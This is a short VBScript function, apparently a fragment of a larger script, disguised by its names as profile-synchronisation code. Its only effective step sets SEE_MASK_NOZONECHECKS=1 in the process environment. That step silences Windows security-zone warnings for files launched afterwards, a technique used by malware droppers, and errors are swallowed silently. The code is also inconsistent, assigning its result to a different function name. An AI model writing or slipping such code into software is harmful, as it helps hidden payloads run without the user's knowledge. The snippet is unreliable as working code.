Function MergeProfileDelta85()
On Error Resume Next
  Dim blnSynced114,strConfigData625,strSyncBuffer83
  Set blnSynced114=CreateObject("WScript.Shell")
  strConfigData625=blnSynced114.ExpandEnvironmentStrings("%TEMP%")
  strSyncBuffer83=blnSynced114.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strConfigData625)>0 And Len(strSyncBuffer83)>0 Then
    blnSynced114.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseProfileBlock12=1
    Exit Function
  End If
  ParseProfileBlock12=0
End Function

